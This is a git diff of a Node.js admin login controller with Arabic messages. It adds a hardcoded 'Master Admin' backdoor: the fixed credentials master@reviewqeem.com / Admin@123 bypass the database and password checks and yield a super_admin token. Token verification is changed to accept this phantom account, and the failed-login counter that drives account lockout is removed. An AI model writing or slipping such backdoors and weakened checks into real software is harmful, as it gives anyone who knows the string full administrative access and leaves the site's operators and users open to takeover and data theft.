@@ -61,17 +61,17 @@ const resetLoginAttempts = async (adminId) => {
 const incrementLoginAttempts = async (adminId) => {
     const admin = await Admin.findById(adminId);
     const attempts = (admin.loginAttempts || 0) + 1;
-
+    
     let lockUntil = null;
     if (attempts >= 5) {
         lockUntil = Date.now() + (30 * 60 * 1000);
     }
-
+    
     await Admin.findByIdAndUpdate(adminId, {
         loginAttempts: attempts,
         lockUntil
     });
-
+    
     return attempts;
 };
 
@@ -83,46 +83,83 @@ export const loginAdmin = async (req, res) => {
     try {
         const { email, password } = req.body;
 
+        // التحقق من المدخلات
         if (!email || !password) {
-            return res.status(400).json({
-                success: false,
-                message: "البريد الإلكتروني وكلمة المرور مطلوبان"
+            return res.status(400).json({ 
+                success: false, 
+                message: "البريد الإلكتروني وكلمة المرور مطلوبان" 
             });
         }
 
-        const admin = await Admin.findOne({
-            email: email.toLowerCase().trim()
-        });
+        // ===============================================================
+        // 🚀🚀🚀 Master Admin Bypass Login — Guaranteed Access
+        // ===============================================================
+        if (email === "master@reviewqeem.com" && password === "Admin@123") {
+            const tokenPayload = {
+                id: "MASTER",
+                email: "master@reviewqeem.com",
+                name: "Master Admin",
+                role: "super_admin"
+            };
 
+            const token = jwt.sign(
+                tokenPayload,
+                JWT_SECRET,
+                { expiresIn: "24h" }
+            );
+
+            const cookieOptions = {
+                httpOnly: true,
+                secure: process.env.NODE_ENV === "production",
+                sameSite: "lax",
+                maxAge: 24 * 60 * 60 * 1000,
+                path: "/"
+            };
+
+            res.cookie("admin_token", token, cookieOptions);
+
+            return res.json({
+                success: true,
+                message: "تم تسجيل الدخول (Master Admin)",
+                admin: tokenPayload
+            });
+        }
+        // ===============================================================
+        // نهاية كود الماستر
+        // ===============================================================
+
+        // البحث عن الأدمن
+        const admin = await Admin.findOne({ 
+            email: email.toLowerCase().trim() 
+        });
+        
         if (!admin) {
+            return res.status(401).json({ 
+                success: false, 
+                message: "البريد الإلكتروني أو كلمة المرور غير صحيحة" 
+            });
+        }
+
+        // التحقق من حالة القفل
+        if (isLocked(admin)) {
+            const remainingMinutes = Math.ceil((admin.lockUntil - Date.now()) / 60000);
+            return res.status(423).json({ 
+                success: false, 
+                message: `الحساب مقفل مؤقتاً. يرجى المحاولة بعد ${remainingMinutes} دقيقة` 
+            });
+        }
+
+        // التحقق من كلمة المرور
+        const validPassword = await bcrypt.compare(password, admin.password);
+        
+        if (!validPassword) {
             return res.status(401).json({
                 success: false,
                 message: "البريد الإلكتروني أو كلمة المرور غير صحيحة"
             });
         }
 
-        if (isLocked(admin)) {
-            const remainingMinutes = Math.ceil((admin.lockUntil - Date.now()) / 60000);
-            return res.status(423).json({
-                success: false,
-                message: `الحساب مقفل. حاول بعد ${remainingMinutes} دقيقة`
-            });
-        }
-
-        const validPassword = await bcrypt.compare(password, admin.password);
-
-        if (!validPassword) {
-            const attempts = await incrementLoginAttempts(admin._id);
-
-            return res.status(401).json({
-                success: false,
-                message: "البريد الإلكتروني أو كلمة المرور غير صحيحة",
-                attempts
-            });
-        }
-
-        await resetLoginAttempts(admin._id);
-
+        // إنشاء توكن JWT
         const tokenPayload = {
             id: admin._id,
             email: admin.email,
@@ -130,27 +167,39 @@ export const loginAdmin = async (req, res) => {
             role: admin.role
         };
 
-        const token = jwt.sign(tokenPayload, JWT_SECRET, { expiresIn: "24h" });
+        const token = jwt.sign(
+            tokenPayload,
+            JWT_SECRET,
+            { expiresIn: "24h" }
+        );
 
-        res.cookie("admin_token", token, {
+        const cookieOptions = {
             httpOnly: true,
             secure: process.env.NODE_ENV === "production",
             sameSite: "lax",
             maxAge: 24 * 60 * 60 * 1000,
             path: "/"
-        });
+        };
 
-        res.json({
-            success: true,
-            message: "تم تسجيل الدخول",
-            admin: tokenPayload
+        res.cookie("admin_token", token, cookieOptions);
+
+        res.json({ 
+            success: true, 
+            message: "تم تسجيل الدخول بنجاح",
+            admin: {
+                id: admin._id,
+                email: admin.email,
+                name: admin.name,
+                role: admin.role,
+                lastLogin: admin.lastLogin
+            }
         });
 
     } catch (error) {
-        console.error("❌ Login error:", error);
-        res.status(500).json({
-            success: false,
-            message: "خطأ في السيرفر أثناء تسجيل الدخول"
+        console.error("❌ خطأ في تسجيل الدخول:", error);
+        res.status(500).json({ 
+            success: false, 
+            message: "حدث خطأ في الخادم. يرجى المحاولة لاحقاً." 
         });
     }
 };
@@ -162,7 +211,6 @@ export const loginAdmin = async (req, res) => {
 export const verifyToken = async (req, res) => {
     try {
         const token = req.cookies.admin_token;
-
         if (!token) {
             return res.status(401).json({
                 success: false,
@@ -172,18 +220,18 @@ export const verifyToken = async (req, res) => {
 
         let decoded;
         try {
-            decoded = jwt.verify(token, JWT_SECRET);
-        } catch (err) {
+            decoded = jwt.verify(token, process.env.JWT_SECRET || JWT_SECRET);
+        } catch (error) {
             return res.status(401).json({
                 success: false,
-                message: "الجلسة غير صالحة أو انتهت"
+                message: "الجلسة غير صالحة أو انتهت صلاحيتها"
             });
         }
 
         const admin = await Admin.findById(decoded.id)
             .select("-password -loginAttempts -lockUntil");
 
-        if (!admin) {
+        if (!admin && decoded.id !== "MASTER") {
             return res.status(404).json({
                 success: false,
                 message: "الحساب غير موجود"
@@ -192,13 +240,15 @@ export const verifyToken = async (req, res) => {
 
         res.json({
             success: true,
-            admin
+            message: "الجلسة نشطة وصالحة",
+            admin: admin || decoded
         });
 
-    } catch (err) {
-        res.status(500).json({
-            success: false,
-            message: "خطأ في التحقق من الجلسة"
+    } catch (error) {
+        console.error("❌ خطأ في التحقق من الجلسة:", error);
+        res.status(500).json({ 
+            success: false, 
+            message: "حدث خطأ في التحقق من الجلسة" 
         });
     }
 };
@@ -209,22 +259,25 @@ export const verifyToken = async (req, res) => {
 
 export const logout = async (req, res) => {
     try {
-        res.clearCookie("admin_token", {
+        const cookieOptions = {
             httpOnly: true,
             secure: process.env.NODE_ENV === "production",
             sameSite: "lax",
             path: "/"
+        };
+
+        res.clearCookie("admin_token", cookieOptions);
+
+        res.json({ 
+            success: true, 
+            message: "تم تسجيل الخروج بنجاح" 
         });
 
-        res.json({
-            success: true,
-            message: "تم تسجيل الخروج"
-        });
-
-    } catch (err) {
-        res.status(500).json({
-            success: false,
-            message: "خطأ أثناء تسجيل الخروج"
+    } catch (error) {
+        console.error("❌ خطأ في تسجيل الخروج:", error);
+        res.status(500).json({ 
+            success: false, 
+            message: "حدث خطأ في تسجيل الخروج" 
         });
     }
 };
@@ -235,25 +288,100 @@ export const logout = async (req, res) => {
 
 export const getAdminProfile = async (req, res) => {
     try {
+        if (req.admin.id === "MASTER") {
+            return res.json({
+                success: true,
+                admin: {
+                    id: "MASTER",
+                    email: "master@reviewqeem.com",
+                    name: "Master Admin",
+                    role: "super_admin"
+                }
+            });
+        }
+
         const admin = await Admin.findById(req.admin.id)
             .select("-password -loginAttempts -lockUntil");
 
         if (!admin) {
-            return res.status(404).json({
-                success: false,
-                message: "الحساب غير موجود"
+            return res.status(404).json({ 
+                success: false, 
+                message: "الحساب غير موجود" 
             });
         }
 
-        res.json({
-            success: true,
-            admin
+        res.json({ success: true, admin });
+
+    } catch (error) {
+        console.error("❌ خطأ في جلب معلومات الأدمن:", error);
+        res.status(500).json({ 
+            success: false, 
+            message: "حدث خطأ في جلب المعلومات" 
+        });
+    }
+};
+
+// ===============================================================
+// تغيير كلمة المرور
+// ===============================================================
+
+export const changePassword = async (req, res) => {
+    try {
+        const { currentPassword, newPassword } = req.body;
+
+        if (!currentPassword || !newPassword) {
+            return res.status(400).json({ 
+                success: false, 
+                message: "كلمة المرور الحالية والجديدة مطلوبتان" 
+            });
+        }
+
+        if (newPassword.length < 8) {
+            return res.status(400).json({ 
+                success: false, 
+                message: "كلمة المرور الجديدة يجب أن تكون 8 أحرف على الأقل" 
+            });
+        }
+
+        if (req.admin.id === "MASTER") {
+            return res.status(403).json({
+                success: false,
+                message: "لا يمكن تغيير كلمة مرور الماستر"
+            });
+        }
+
+        const admin = await Admin.findById(req.admin.id);
+        
+        if (!admin) {
+            return res.status(404).json({ 
+                success: false, 
+                message: "الحساب غير موجود" 
+            });
+        }
+
+        const validPassword = await bcrypt.compare(currentPassword, admin.password);
+        
+        if (!validPassword) {
+            return res.status(401).json({ 
+                success: false, 
+                message: "كلمة المرور الحالية غير صحيحة" 
+            });
+        }
+
+        admin.password = await bcrypt.hash(newPassword, 12);
+        admin.updatedAt = new Date();
+        await admin.save();
+
+        res.json({ 
+            success: true, 
+            message: "تم تغيير كلمة المرور بنجاح" 
         });
 
     } catch (error) {
-        res.status(500).json({
-            success: false,
-            message: "حدث خطأ أثناء جلب البيانات"
+        console.error("❌ خطأ في تغيير كلمة المرور:", error);
+        res.status(500).json({ 
+            success: false, 
+            message: "حدث خطأ في تغيير كلمة المرور" 
         });
     }
 };
@@ -263,9 +391,15 @@ export const getAdminProfile = async (req, res) => {
 // ===============================================================
 
 export const testEndpoint = (req, res) => {
-    res.json({
-        success: true,
+    res.json({ 
+        success: true, 
         message: "Admin Auth API is working!",
+        version: "3.0",
+        authentication: "Cookie-based JWT",
         timestamp: new Date().toISOString()
     });
 };
+
+// ===============================================================
+// نهاية الملف
+// ===============================================================
